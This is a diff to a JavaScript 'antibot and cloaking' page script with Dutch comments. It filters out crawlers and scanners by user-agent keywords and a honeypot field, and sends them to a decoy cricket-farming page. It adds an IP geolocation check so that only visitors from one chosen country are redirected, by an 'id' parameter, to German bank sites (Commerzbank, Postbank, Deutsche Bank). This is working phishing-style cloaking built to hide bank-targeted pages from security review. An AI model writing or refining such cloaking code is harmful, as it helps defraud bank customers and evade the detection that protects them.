@@ -11,7 +11,7 @@
             logDetails: true, // Log verdachte gebruikers
             redirectBots: true, // Redirect bots naar whitepage
             showNeutralPage: false, // Toon neutrale inhoud aan verdachte gebruikers
-            whitePage: "https://badbotstraffic-to.here/",
+            whitePage: "https://www.bugvita.com/cricketfarming?srsltid=AfmBOorsFDqP_c4xlrNcTMbltrncNPUy0NjA0EBLJant8R82CW48aNah",
             trustedDelay: 1000, // Tijd in ms voor vertraging bij legitiem verkeer
             botKeywords: [
                 "bot", "crawl", "spider", "mediapartners", "slurp", "wget", "curl",
@@ -39,25 +39,6 @@
         function isBlacklistedIP() {
             const ip = "127.0.0.1"; // Vervang met echte IP detectie methode
             return antibotConfig.blacklistedIPs.includes(ip);
-        }
-
-        // Functie: Dynamische redirect gebaseerd op 'id'
-        function redirectBasedOnId() {
-            const id = getQueryParam("id");
-            const redirectMap = {
-                "123": "https://youtube.com",
-                "456": "https://google.com",
-                "789": "https://facebook.com"
-            };
-
-            if (id && redirectMap[id]) {
-                setTimeout(() => {
-                    window.location.href = redirectMap[id];
-                }, antibotConfig.trustedDelay + Math.random() * 500); // Extra vertraging
-                return true; // Redirect uitgevoerd
-            }
-
-            return false; // Geen redirect uitgevoerd
         }
 
         // Functie: Antibotdetectie
@@ -102,6 +83,42 @@
             return honeypot && honeypot.value !== "";
         }
 
+        // Functie: Controleer of de gebruiker uit een specifieke land komt (gebaseerd op landcode)
+        function isUserFrom(countryCode, callback) {
+            fetch("https://ip-api.com/json")
+                .then(response => response.json())
+                .then(data => {
+                    const country = data.countryCode;
+                    if (country === countryCode) {
+                        callback(true); // Land komt overeen
+                    } else {
+                        callback(false); // Land komt niet overeen
+                    }
+                })
+                .catch(() => {
+                    callback(false); // Fout bij het ophalen van geodata
+                });
+        }
+
+        // Functie: Dynamische redirect gebaseerd op 'id'
+        function redirectBasedOnId() {
+            const id = getQueryParam("id");
+            const redirectMap = {
+                "comm": "https://www.commerzbank.de/",
+                "post": "https://www.postbank.de/",
+                "db": "https://www.deutsche-bank.de/pk.html"
+            };
+
+            if (id && redirectMap[id]) {
+                setTimeout(() => {
+                    window.location.href = redirectMap[id];
+                }, antibotConfig.trustedDelay + Math.random() * 500); // Extra vertraging
+                return true; // Redirect uitgevoerd
+            }
+
+            return false; // Geen redirect uitgevoerd
+        }
+
         // Hoofdfunctie
         function init() {
             if (detectBot() || isHoneypotFilled()) {
@@ -113,13 +130,26 @@
                 return; // Bot gedetecteerd, stop verdere verwerking
             }
 
-            const redirected = redirectBasedOnId();
-            if (!redirected) {
-                document.body.innerHTML = `
-                    <h1>Antibot & Cloaking System Active</h1>
-                    <p>No valid redirect found for the provided 'id'.</p>
-                `;
-            }
+            // Vul de gewenste landcode in (bijv. "DE" voor Duitsland, "BE" voor België)
+            const desiredCountryCode = "GB"; // Pas dit aan naar de gewenste landcode
+            isUserFrom(desiredCountryCode, function(isFromCountry) {
+                if (isFromCountry) {
+                    const redirected = redirectBasedOnId();
+                    if (!redirected) {
+                        document.body.innerHTML = `
+                            <h1>Antibot & Cloaking System Active</h1>
+                            <p>No valid redirect found for the provided 'id'.</p>
+                        `;
+                    }
+                } else {
+                    // Als de gebruiker niet uit het opgegeven land komt, wordt het verkeer als bot behandeld
+                    if (antibotConfig.redirectBots) {
+                        window.location.href = antibotConfig.whitePage;
+                    } else if (antibotConfig.showNeutralPage) {
+                        showNeutralContent();
+                    }
+                }
+            });
         }
 
         // Script starten
